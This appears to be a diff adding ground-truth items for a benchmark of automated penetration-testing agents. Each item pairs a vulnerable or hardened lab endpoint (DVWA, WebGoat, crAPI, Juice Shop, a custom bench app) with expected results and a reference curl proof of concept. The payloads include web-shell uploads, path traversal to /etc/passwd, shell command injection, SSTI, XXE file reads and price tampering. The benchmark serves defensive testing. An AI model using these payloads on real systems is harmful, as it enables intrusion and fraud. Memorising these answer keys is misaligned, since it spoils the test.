+  expected_reproduction_evidence: HTTP 200 confirms file saved to webroot.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if file extension rejected.
+  pass_fail_criteria: PASS if reported with CWE-434.
+  reference_poc:
+    curl: curl -s -X POST -F 'file=@shell.php' 'http://pentesa-bench:8080/upload/file'
+    files:
+      file: shell.php
+  expected_vulnerable_signature: uploaded
+- id: GT-UPLD-02-V
+  app: dvwa
+  endpoint: /vulnerabilities/upload/
+  method: POST
+  parameter: uploaded
+  category: File upload vulnerabilities
+  wstg_id: WSTG-BUSL-08
+  cwe: CWE-434
+  vulnerable: true
+  known_vulnerability_condition: DVWA low/medium allows uploading arbitrary PHP script.
+  expected_secure_behavior: Content-type and extension validation.
+  expected_discovery_result: Upload endpoint identified.
+  expected_agent_behavior: Executes non-destructive file upload test.
+  expected_reproduction_evidence: File accepted message returned.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if upload rejected.
+  pass_fail_criteria: PASS if reported with CWE-434.
+  reference_poc:
+    curl: curl -s -X POST -F 'uploaded=@test.php' 'http://dvwa:80/vulnerabilities/upload/'
+    files:
+      uploaded: test.php
+  expected_vulnerable_signature: succesfully uploaded
+- id: GT-UPLD-03-V
+  app: pentesa-bench
+  endpoint: /upload/file
+  method: POST
+  parameter: file
+  category: File upload vulnerabilities
+  wstg_id: WSTG-BUSL-08
+  cwe: CWE-434
+  vulnerable: true
+  known_vulnerability_condition: Double extension bypass (.php.jpg) accepted as executable.
+  expected_secure_behavior: Inspection of MIME magic bytes and strict canonical extension.
+  expected_discovery_result: Upload form identified.
+  expected_agent_behavior: Tests bypass techniques.
+  expected_reproduction_evidence: File saved and accessible.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if rejected.
+  pass_fail_criteria: PASS if reported with CWE-434.
+  reference_poc:
+    curl: curl -s -X POST -F 'file=@shell.php.png' 'http://pentesa-bench:8080/upload/file'
+    files:
+      file: shell.php.png
+  expected_vulnerable_signature: uploaded
+- id: GT-UPLD-01-S
+  app: pentesa-bench
+  endpoint: /upload/secure
+  method: POST
+  parameter: file
+  category: File upload vulnerabilities
+  wstg_id: WSTG-BUSL-08
+  cwe: CWE-434
+  vulnerable: false
+  known_vulnerability_condition: Validates extension against whitelist (.png, .jpg) and verifies image header.
+  expected_secure_behavior: Executable files rejected with HTTP 400 Bad Request.
+  expected_discovery_result: Upload form identified.
+  expected_agent_behavior: Observes 400 rejection; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting file upload vulnerability on /upload/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s -X POST -F 'file=@shell.php' 'http://pentesa-bench:8080/upload/secure'
+    files:
+      file: shell.php
+  expected_secure_signature: Only image files
+- id: GT-TRAV-01-V
+  app: pentesa-bench
+  endpoint: /files/read
+  method: GET
+  parameter: filename
+  category: Path traversal
+  wstg_id: WSTG-ATHZ-01
+  cwe: CWE-22
+  vulnerable: true
+  known_vulnerability_condition: Directory traversal via ../ sequences allows reading arbitrary files outside base directory.
+  expected_secure_behavior: Canonical path resolution verifies file remains within allowed base directory.
+  expected_discovery_result: File reader parameter 'filename' discovered.
+  expected_agent_behavior: Retrieves sensitive file contents outside public folder.
+  expected_reproduction_evidence: HTTP 200 returns FLAG{PENTESA_BENCH_PATH_TRAVERSAL_VERIFIED_7a9f}.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if path traversal fails to read file.
+  pass_fail_criteria: PASS if reported with CWE-22.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/files/read?filename=..%2Fsecret.key'
+    params:
+      filename: ../secret.key
+  expected_vulnerable_signature: FLAG{PENTESA_BENCH_PATH_TRAVERSAL_VERIFIED_7a9f}
+- id: GT-TRAV-02-V
+  app: dvwa
+  endpoint: /vulnerabilities/fi/
+  method: GET
+  parameter: page
+  category: Path traversal
+  wstg_id: WSTG-ATHZ-01
+  cwe: CWE-22
+  vulnerable: true
+  known_vulnerability_condition: DVWA file inclusion accepts ../../../../etc/passwd in 'page' parameter.
+  expected_secure_behavior: Strict file inclusion whitelist.
+  expected_discovery_result: Parameter 'page' identified.
+  expected_agent_behavior: Detects /etc/passwd contents in response body.
+  expected_reproduction_evidence: root:x:0:0:root returned.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if inclusion rejected.
+  pass_fail_criteria: PASS if reported with CWE-22.
+  reference_poc:
+    curl: curl -s 'http://dvwa:80/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+    params:
+      page: ../../../../etc/passwd
+  expected_vulnerable_signature: root:x:0:0
+- id: GT-TRAV-03-V
+  app: pentesa-bench
+  endpoint: /files/read
+  method: GET
+  parameter: filename
+  category: Path traversal
+  wstg_id: WSTG-ATHZ-01
+  cwe: CWE-22
+  vulnerable: true
+  known_vulnerability_condition: Nested traversal sequence (....//....//) bypasses naive string replace.
+  expected_secure_behavior: Resolves canonical path after decoding.
+  expected_discovery_result: Parameter 'filename' identified.
+  expected_agent_behavior: Filter bypass successful.
+  expected_reproduction_evidence: Sensitive file retrieved.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if blocked.
+  pass_fail_criteria: PASS if reported with CWE-22.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/files/read?filename=....%2F%2F....%2F%2Fsecret.key'
+    params:
+      filename: '....//....//secret.key'
+  expected_vulnerable_signature: FLAG{PENTESA_BENCH_PATH_TRAVERSAL_VERIFIED_7a9f}
+- id: GT-TRAV-01-S
+  app: pentesa-bench
+  endpoint: /files/secure
+  method: GET
+  parameter: filename
+  category: Path traversal
+  wstg_id: WSTG-ATHZ-01
+  cwe: CWE-22
+  vulnerable: false
+  known_vulnerability_condition: Strict os.path.realpath checking ensures path remains within public folder.
+  expected_secure_behavior: Directory traversal attempts rejected with HTTP 400 Bad Request.
+  expected_discovery_result: Parameter 'filename' identified.
+  expected_agent_behavior: Observes 400 error; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting path traversal on /files/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/files/secure?filename=..%2Fsecret.key'
+    params:
+      filename: ../secret.key
+  expected_secure_signature: Directory traversal detected
+- id: GT-CMDI-01-V
+  app: pentesa-bench
+  endpoint: /cmd/ping
+  method: GET
+  parameter: host
+  category: Command injection
+  wstg_id: WSTG-INPV-12
+  cwe: CWE-78
+  vulnerable: true
+  known_vulnerability_condition: Parameter 'host' concatenated into shell=True subprocess execution string.
+  expected_secure_behavior: Arguments passed as list to subprocess.run without shell=True; strict IP validation.
+  expected_discovery_result: Parameter 'host' discovered.
+  expected_agent_behavior: Executes non-destructive id command and detects uid response.
+  expected_reproduction_evidence: HTTP 200 response contains uid= output.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if command metacharacters rejected.
+  pass_fail_criteria: PASS if reported with CWE-78.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/cmd/ping?host=127.0.0.1%3Bid'
+    params:
+      host: 127.0.0.1;id
+  expected_vulnerable_signature: uid=
+- id: GT-CMDI-02-V
+  app: dvwa
+  endpoint: /vulnerabilities/exec/
+  method: POST
+  parameter: ip
+  category: Command injection
+  wstg_id: WSTG-INPV-12
+  cwe: CWE-78
+  vulnerable: true
+  known_vulnerability_condition: DVWA command injection concatenates input directly into shell_exec.
+  expected_secure_behavior: escapeshellcmd / escapeshellarg or regex validation.
+  expected_discovery_result: Ping utility form identified.
+  expected_agent_behavior: Confirms command execution.
+  expected_reproduction_evidence: Operating system command output returned.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if metacharacters stripped.
+  pass_fail_criteria: PASS if reported with CWE-78.
+  reference_poc:
+    curl: curl -s -X POST -d 'ip=127.0.0.1;id&Submit=Submit' 'http://dvwa:80/vulnerabilities/exec/'
+    data:
+      ip: 127.0.0.1;id
+      Submit: Submit
+  expected_vulnerable_signature: uid=
+- id: GT-CMDI-03-V
+  app: pentesa-bench
+  endpoint: /cmd/ping
+  method: GET
+  parameter: host
+  category: Command injection
+  wstg_id: WSTG-INPV-12
+  cwe: CWE-78
+  vulnerable: true
+  known_vulnerability_condition: Pipe operator (|) command injection.
+  expected_secure_behavior: Disallow pipe operator.
+  expected_discovery_result: Parameter 'host' identified.
+  expected_agent_behavior: Pipe injection confirmed.
+  expected_reproduction_evidence: Command execution observed.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if rejected.
+  pass_fail_criteria: PASS if reported with CWE-78.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/cmd/ping?host=127.0.0.1%7Cid'
+    params:
+      host: 127.0.0.1|id
+  expected_vulnerable_signature: uid=
+- id: GT-CMDI-01-S
+  app: pentesa-bench
+  endpoint: /cmd/secure
+  method: GET
+  parameter: host
+  category: Command injection
+  wstg_id: WSTG-INPV-12
+  cwe: CWE-78
+  vulnerable: false
+  known_vulnerability_condition: Strict IPv4/IPv6 regex validation; non-IP inputs rejected with HTTP 400.
+  expected_secure_behavior: Rejects shell metacharacters with 400 Bad Request.
+  expected_discovery_result: Parameter 'host' identified.
+  expected_agent_behavior: Observes 400 rejection; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting command injection on /cmd/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/cmd/secure?host=127.0.0.1%3Bid'
+    params:
+      host: 127.0.0.1;id
+  expected_secure_signature: Invalid host
+- id: GT-SSTI-01-V
+  app: pentesa-bench
+  endpoint: /ssti/render
+  method: GET
+  parameter: name
+  category: SSTI
+  wstg_id: WSTG-INPV-18
+  cwe: CWE-1336
+  vulnerable: true
+  known_vulnerability_condition: 'Jinja2 template rendered directly from user string: Template(f''...{name}...'').'
+  expected_secure_behavior: Pass user input as context variable to pre-compiled template.
+  expected_discovery_result: GET parameter 'name' identified.
+  expected_agent_behavior: Evaluates math expression {{7*7}} to 49.
+  expected_reproduction_evidence: Rendered response contains 49.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if rendered literally as {{7*7}}.
+  pass_fail_criteria: PASS if reported with CWE-1336.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/ssti/render?name=%7B%7B7%2A7%7D%7D'
+    params:
+      name: '{{7*7}}'
+  expected_vulnerable_signature: '49'
+- id: GT-SSTI-02-V
+  app: pentesa-bench
+  endpoint: /ssti/render
+  method: GET
+  parameter: name
+  category: SSTI
+  wstg_id: WSTG-INPV-18
+  cwe: CWE-1336
+  vulnerable: true
+  known_vulnerability_condition: Object traversal via template expression {{request.app.state}}.
+  expected_secure_behavior: Sandboxed template environment.
+  expected_discovery_result: Parameter 'name' identified.
+  expected_agent_behavior: Dumps application state object.
+  expected_reproduction_evidence: State object representation returned in HTML.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if literal string returned.
+  pass_fail_criteria: PASS if reported with CWE-1336.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/ssti/render?name=%7B%7Brequest.scope%7D%7D'
+    params:
+      name: '{{request.scope}}'
+  expected_vulnerable_signature: scope
+- id: GT-SSTI-03-V
+  app: webgoat
+  endpoint: /WebGoat/SSTI
+  method: POST
+  parameter: template
+  category: SSTI
+  wstg_id: WSTG-INPV-18
+  cwe: CWE-1336
+  vulnerable: true
+  known_vulnerability_condition: WebGoat SSTI exercise evaluates user template expression.
+  expected_secure_behavior: Context variable binding.
+  expected_discovery_result: Template parameter identified.
+  expected_agent_behavior: Detects template engine execution.
+  expected_reproduction_evidence: Evaluated expression output.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if rejected.
+  pass_fail_criteria: PASS if reported with CWE-1336.
+  reference_poc:
+    curl: curl -s -X POST -d 'template=${7*7}' 'http://webgoat:8080/WebGoat/SSTI'
+    data:
+      template: ${7*7}
+  expected_vulnerable_signature: '49'
+- id: GT-SSTI-01-S
+  app: pentesa-bench
+  endpoint: /ssti/secure
+  method: GET
+  parameter: name
+  category: SSTI
+  wstg_id: WSTG-INPV-18
+  cwe: CWE-1336
+  vulnerable: false
+  known_vulnerability_condition: Template compiled statically; user input passed as data variable name=name.
+  expected_secure_behavior: Template expressions treated as literal text; output renders '{{7*7}}'.
+  expected_discovery_result: Parameter 'name' identified.
+  expected_agent_behavior: Observes literal output; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting SSTI on /ssti/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/ssti/secure?name=%7B%7B7%2A7%7D%7D'
+    params:
+      name: '{{7*7}}'
+  expected_secure_signature: '{{7*7}}'
+- id: GT-XXE-01-V
+  app: pentesa-bench
+  endpoint: /xxe/parse
+  method: POST
+  parameter: body
+  category: XXE
+  wstg_id: WSTG-INPV-07
+  cwe: CWE-611
+  vulnerable: true
+  known_vulnerability_condition: lxml XMLParser configured with resolve_entities=True and dtd_validation=True.
+  expected_secure_behavior: External DTD resolution disabled; defusedxml used.
+  expected_discovery_result: XML parsing endpoint identified.
+  expected_agent_behavior: Resolves local file external entity.
+  expected_reproduction_evidence: HTTP 200 response contains secret key content.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if DTD rejected.
+  pass_fail_criteria: PASS if reported with CWE-611.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/xml'' -d ''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/data/secret.key">]><data>&xxe;</data>''
+      ''http://pentesa-bench:8080/xxe/parse'''
+    data: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/data/secret.key">]><data>&xxe;</data>
+  expected_vulnerable_signature: FLAG{PENTESA_BENCH_PATH_TRAVERSAL_VERIFIED_7a9f}
+- id: GT-XXE-02-V
+  app: webgoat
+  endpoint: /WebGoat/xxe/simple
+  method: POST
+  parameter: comment
+  category: XXE
+  wstg_id: WSTG-INPV-07
+  cwe: CWE-611
+  vulnerable: true
+  known_vulnerability_condition: WebGoat XXE simple parser processes external entity declaration.
+  expected_secure_behavior: Disable external general entities.
+  expected_discovery_result: XML endpoint identified.
+  expected_agent_behavior: Resolves entity.
+  expected_reproduction_evidence: Entity replacement returned.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if rejected.
+  pass_fail_criteria: PASS if reported with CWE-611.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE d [<!ENTITY e "xxe_test">]><comment><text>&e;</text></comment>''
+      ''http://webgoat:8080/WebGoat/xxe/simple'''
+    data: <?xml version="1.0"?><!DOCTYPE d [<!ENTITY e "xxe_test">]><comment><text>&e;</text></comment>
+  expected_vulnerable_signature: xxe_test
+- id: GT-XXE-03-V
+  app: pentesa-bench
+  endpoint: /xxe/parse
+  method: POST
+  parameter: body
+  category: XXE
+  wstg_id: WSTG-INPV-07
+  cwe: CWE-611
+  vulnerable: true
+  known_vulnerability_condition: 'Out-of-band SSRF via XXE entity referencing canary sensor: http://bench-canary:9099/trap/xxe.'
+  expected_secure_behavior: Network entity resolution prohibited.
+  expected_discovery_result: XML endpoint identified.
+  expected_agent_behavior: OOB canary sensor hit recorded.
+  expected_reproduction_evidence: Canary trap receives XML external entity callback.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if network fetch blocked.
+  pass_fail_criteria: PASS if reported with CWE-611.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/xml'' -d ''<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://bench-canary:9099/trap/xxe">%xxe;]><data>test</data>''
+      ''http://pentesa-bench:8080/xxe/parse'''
+    data: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://bench-canary:9099/trap/xxe">%xxe;]><data>test</data>
+  expected_vulnerable_signature: Parsed XML successfully
+- id: GT-XXE-01-S
+  app: pentesa-bench
+  endpoint: /xxe/secure
+  method: POST
+  parameter: body
+  category: XXE
+  wstg_id: WSTG-INPV-07
+  cwe: CWE-611
+  vulnerable: false
+  known_vulnerability_condition: Parsed with defusedxml; external entity resolution strictly disabled.
+  expected_secure_behavior: XML containing DTD declarations rejected with HTTP 400 Bad Request.
+  expected_discovery_result: XML endpoint identified.
+  expected_agent_behavior: Observes 400 rejection; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting XXE on /xxe/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/xml'' -d ''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>''
+      ''http://pentesa-bench:8080/xxe/secure'''
+    data: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+  expected_secure_signature: XML parsing rejected
+- id: GT-APIS-01-V
+  app: crapi
+  endpoint: /workshop/api/shop/orders/all
+  method: GET
+  parameter: Authorization
+  category: API security weaknesses
+  wstg_id: WSTG-APIT-01
+  cwe: CWE-213
+  vulnerable: true
+  known_vulnerability_condition: 'Excessive data exposure: returns all customer orders including PII and payment tokens.'
+  expected_secure_behavior: DTO projection returns only caller's order summary.
+  expected_discovery_result: API endpoint identified.
+  expected_agent_behavior: Detects excessive data exposure.
+  expected_reproduction_evidence: Customer credit cards and addresses returned.
+  expected_severity: MEDIUM
+  expected_false_positive_behavior: Do not report if filtered.
+  pass_fail_criteria: PASS if reported with CWE-213.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer <user_token>'' ''http://crapi-workshop:8080/workshop/api/shop/orders/all'''
+  expected_vulnerable_signature: orders
+- id: GT-APIS-02-V
+  app: pentesa-bench
+  endpoint: /api/v1/orders/all
+  method: GET
+  parameter: Authorization
+  category: API security weaknesses
+  wstg_id: WSTG-APIT-01
+  cwe: CWE-213
+  vulnerable: true
+  known_vulnerability_condition: Unfiltered database dump exposing customer credit cards and internal gateway tokens.
+  expected_secure_behavior: Serializer whitelists only non-sensitive public order attributes.
+  expected_discovery_result: Orders API endpoint identified.
+  expected_agent_behavior: Detects raw credit card numbers and internal tokens in response schema.
+  expected_reproduction_evidence: HTTP 200 contains FLAG{PENTESA_EXCESSIVE_DATA_EXPOSURE_TOKEN_332a}.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if sensitive fields redacted.
+  pass_fail_criteria: PASS if reported with CWE-213.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/api/v1/orders/all'
+  expected_vulnerable_signature: FLAG{PENTESA_EXCESSIVE_DATA_EXPOSURE_TOKEN_332a}
+- id: GT-APIS-03-V
+  app: crapi
+  endpoint: /community/api/v2/community/posts/recent
+  method: GET
+  parameter: Authorization
+  category: API security weaknesses
+  wstg_id: WSTG-APIT-01
+  cwe: CWE-213
+  vulnerable: true
+  known_vulnerability_condition: Recent posts API exposes author internal database identifiers and private email addresses.
+  expected_secure_behavior: User profile projection strips private contact information.
+  expected_discovery_result: Community posts endpoint identified.
+  expected_agent_behavior: Flags sensitive metadata fields.
+  expected_reproduction_evidence: Author emails returned in public feed.
+  expected_severity: LOW
+  expected_false_positive_behavior: Do not report if emails masked.
+  pass_fail_criteria: PASS if reported with CWE-213.
+  reference_poc:
+    curl: curl -s 'http://crapi-community:8080/community/api/v2/community/posts/recent'
+  expected_vulnerable_signature: author
+- id: GT-APIS-01-S
+  app: pentesa-bench
+  endpoint: /api/v1/orders/secure
+  method: GET
+  parameter: Authorization
+  category: API security weaknesses
+  wstg_id: WSTG-APIT-01
+  cwe: CWE-213
+  vulnerable: false
+  known_vulnerability_condition: Strict DTO projection exposing only order_id, item_summary, and status.
+  expected_secure_behavior: Zero credit cards or internal secrets returned.
+  expected_discovery_result: Secure orders endpoint identified.
+  expected_agent_behavior: Confirms clean schema; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting excessive data exposure on /api/v1/orders/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/api/v1/orders/secure'
+  expected_secure_signature: Security Consulting Package
+- id: GT-RACE-01-V
+  app: pentesa-bench
+  endpoint: /race/coupon
+  method: POST
+  parameter: coupon_code
+  category: Race conditions
+  wstg_id: WSTG-BUSL-04
+  cwe: CWE-362
+  vulnerable: true
+  known_vulnerability_condition: Time-of-check to time-of-use (TOCTOU) concurrency flaw allows redeeming single-use coupon
+    multiple times.
+  expected_secure_behavior: Database-level atomic transaction serialization with lock.
+  expected_discovery_result: Coupon redemption endpoint identified.
+  expected_agent_behavior: Detects concurrent redemption anomaly.
+  expected_reproduction_evidence: Single coupon redeemed multiple times across parallel threads.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if concurrent requests are serialized safely.
+  pass_fail_criteria: PASS if reported with CWE-362.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"coupon_code":"WELCOME2026","user_id":"1"}'' ''http://pentesa-bench:8080/race/coupon'''
+    json:
+      coupon_code: WELCOME2026
+      user_id: '1'
+  expected_vulnerable_signature: redeemed
+- id: GT-RACE-02-V
+  app: pentesa-bench
+  endpoint: /race/coupon
+  method: POST
+  parameter: coupon_code
+  category: Race conditions
+  wstg_id: WSTG-BUSL-04
+  cwe: CWE-362
+  vulnerable: true
+  known_vulnerability_condition: Concurrent balance crediting exceeds authorized promotional value.
+  expected_secure_behavior: Atomic balance decrement/increment.
+  expected_discovery_result: Coupon endpoint identified.
+  expected_agent_behavior: Confirms balance inflated beyond single coupon value.
+  expected_reproduction_evidence: User balance increased by multiple discount units.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if balance reflects exactly one application.
+  pass_fail_criteria: PASS if reported with CWE-362.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"coupon_code":"WELCOME2026","user_id":"1"}'' ''http://pentesa-bench:8080/race/coupon'''
+    json:
+      coupon_code: WELCOME2026
+      user_id: '1'
+  expected_vulnerable_signature: new_balance
+- id: GT-RACE-03-V
+  app: pentesa-bench
+  endpoint: /order/checkout
+  method: POST
+  parameter: item_id
+  category: Race conditions
+  wstg_id: WSTG-BUSL-04
+  cwe: CWE-362
+  vulnerable: true
+  known_vulnerability_condition: 'Inventory depletion race: concurrent checkout requests exceed total stock.'
+  expected_secure_behavior: SELECT FOR UPDATE stock locking.
+  expected_discovery_result: Checkout endpoint identified.
+  expected_agent_behavior: Detects negative stock or overselling anomaly.
+  expected_reproduction_evidence: Multiple orders confirmed beyond stock limit.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if stock check holds.
+  pass_fail_criteria: PASS if reported with CWE-362.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"item_id":"item_101","quantity":1}'' ''http://pentesa-bench:8080/order/checkout'''
+    json:
+      item_id: item_101
+      quantity: 1
+  expected_vulnerable_signature: order_confirmed
+- id: GT-RACE-01-S
+  app: pentesa-bench
+  endpoint: /race/secure
+  method: POST
+  parameter: coupon_code
+  category: Race conditions
+  wstg_id: WSTG-BUSL-04
+  cwe: CWE-362
+  vulnerable: false
+  known_vulnerability_condition: Atomic async mutex lock serializes coupon redemptions; rejects second redemption with HTTP
+    400.
+  expected_secure_behavior: Second and subsequent requests fail with 'Coupon has already been redeemed'.
+  expected_discovery_result: Endpoint identified.
+  expected_agent_behavior: Observes lock holds; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting race condition on /race/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"coupon_code":"WELCOME2026","user_id":"1"}'' ''http://pentesa-bench:8080/race/secure'''
+    json:
+      coupon_code: WELCOME2026
+      user_id: '1'
+  expected_secure_signature: redeemed
+- id: GT-BUSL-01-V
+  app: pentesa-bench
+  endpoint: /order/checkout
+  method: POST
+  parameter: client_price
+  category: Business logic vulnerabilities
+  wstg_id: WSTG-BUSL-01
+  cwe: CWE-840
+  vulnerable: true
+  known_vulnerability_condition: Trusts client-supplied price parameter, allowing purchasers to set item price to $0.01.
+  expected_secure_behavior: Calculate item price strictly from server-side database catalog.
+  expected_discovery_result: Checkout endpoint identified with client_price parameter.
+  expected_agent_behavior: Detects price manipulation anomaly; flags for human review.
+  expected_reproduction_evidence: HTTP 200 confirms order processed at client_price $0.01.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if client price ignored.
+  pass_fail_criteria: PASS if reported and FLAGGED FOR HUMAN REVIEW.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"item_id":"item_101","quantity":1,"client_price":0.01}''
+      ''http://pentesa-bench:8080/order/checkout'''
+    json:
+      item_id: item_101
+      quantity: 1
+      client_price: 0.01
+  expected_vulnerable_signature: 'total_charged": 0.01'
+- id: GT-BUSL-02-V
+  app: pentesa-bench
+  endpoint: /order/checkout
+  method: POST
+  parameter: quantity
+  category: Business logic vulnerabilities
+  wstg_id: WSTG-BUSL-01
+  cwe: CWE-840
+  vulnerable: true
+  known_vulnerability_condition: Negative quantity permitted (-5 items), causing wallet balance to increase fraudulently.
+  expected_secure_behavior: Enforce positive integer quantity validation (> 0).
+  expected_discovery_result: Checkout quantity parameter identified.
+  expected_agent_behavior: Detects balance credit anomaly; flags for human review.
+  expected_reproduction_evidence: Wallet balance credited fraudulently on negative checkout.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if negative quantity rejected.
+  pass_fail_criteria: PASS if reported and FLAGGED FOR HUMAN REVIEW.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"item_id":"item_101","quantity":-2}'' ''http://pentesa-bench:8080/order/checkout'''
+    json:
+      item_id: item_101
+      quantity: -2
+  expected_vulnerable_signature: order_confirmed
+- id: GT-BUSL-03-V
+  app: juiceshop
+  endpoint: /api/BasketItems/
+  method: POST
+  parameter: quantity
+  category: Business logic vulnerabilities
+  wstg_id: WSTG-BUSL-01
+  cwe: CWE-840
+  vulnerable: true
+  known_vulnerability_condition: Juice Shop basket allows negative item quantities to reduce total cart value.
+  expected_secure_behavior: Strict positive quantity validation on server.
+  expected_discovery_result: Basket item API identified.
+  expected_agent_behavior: Flags cart discount anomaly for human review.
+  expected_reproduction_evidence: Negative basket item added successfully.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if rejected.
+  pass_fail_criteria: PASS if reported and FLAGGED FOR HUMAN REVIEW.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"ProductId":1,"BasketId":1,"quantity":-1}'' ''http://juiceshop:3000/api/BasketItems/'''
+    json:
+      ProductId: 1
+      BasketId: 1
+      quantity: -1
+  expected_vulnerable_signature: status
+- id: GT-BUSL-01-S
+  app: pentesa-bench
+  endpoint: /order/secure
+  method: POST
+  parameter: client_price
+  category: Business logic vulnerabilities
+  wstg_id: WSTG-BUSL-01
+  cwe: CWE-840
+  vulnerable: false
+  known_vulnerability_condition: Canonical price calculated from database inventory; client_price completely ignored.
+  expected_secure_behavior: Full catalog price charged ($50.00) regardless of client_price in request body.
+  expected_discovery_result: Checkout endpoint identified.
+  expected_agent_behavior: Observes client_price ignored; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting price tampering on /order/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"item_id":"item_101","quantity":1,"client_price":0.01}''
+      ''http://pentesa-bench:8080/order/secure'''
+    json:
+      item_id: item_101
+      quantity: 1
+      client_price: 0.01
+  expected_secure_signature: 'total_charged": 50.0'
+- id: GT-BUSL-02-S
+  app: pentesa-bench
+  endpoint: /order/secure
+  method: POST
+  parameter: quantity
+  category: Business logic vulnerabilities
+  wstg_id: WSTG-BUSL-01
+  cwe: CWE-840
+  vulnerable: false
+  known_vulnerability_condition: Enforces quantity > 0 and <= 100; rejects negative quantities with HTTP 400 Bad Request.
+  expected_secure_behavior: Negative quantity rejected with 400 Bad Request.
+  expected_discovery_result: Checkout endpoint identified.
+  expected_agent_behavior: Observes 400 rejection; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting negative quantity flaw on /order/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"item_id":"item_101","quantity":-2}'' ''http://pentesa-bench:8080/order/secure'''
+    json:
+      item_id: item_101
+      quantity: -2
+  expected_secure_signature: Invalid order quantity
